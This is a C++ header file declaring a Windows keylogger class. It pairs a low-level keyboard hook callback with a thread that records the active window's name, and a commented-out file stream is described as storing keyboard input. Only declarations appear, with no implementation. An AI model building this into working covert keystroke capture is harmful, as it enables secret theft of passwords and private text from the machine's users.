#pragma once
#include <iostream>
#include <Windows.h>
#include <fstream>
#include "WindowRecorder.h"


class KeyboardLog
{
private:
	//static std::ofstream out;			/* To store the keyboard input */
	static WindowRecorder recorder;		/* The thread that gathers the current name of the window. Static so that it can be referenced in lowlevelkeyboardproc */	
	static bool logStarted;					
public:
	KeyboardLog();
	~KeyboardLog();	
	static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
};

